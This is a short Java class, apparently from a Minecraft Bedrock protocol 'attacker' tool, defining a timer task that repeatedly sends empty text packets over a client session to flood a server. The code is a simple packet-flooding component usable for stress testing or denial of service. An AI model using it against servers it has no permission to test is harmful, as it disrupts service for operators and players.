package com.nukkitx.protocol.attacker.task;

import com.nukkitx.protocol.bedrock.BedrockClientSession;
import com.nukkitx.protocol.bedrock.packet.TextPacket;

import java.util.TimerTask;

public class TextPacketAttack extends TimerTask {

    private static final TextPacket PACKET = new TextPacket();

    private final BedrockClientSession session;

    public TextPacketAttack(BedrockClientSession session) {
        this.session = session;
    }

    @Override
    public void run() {
        this.session.sendPacketImmediately(PACKET);
    }
}
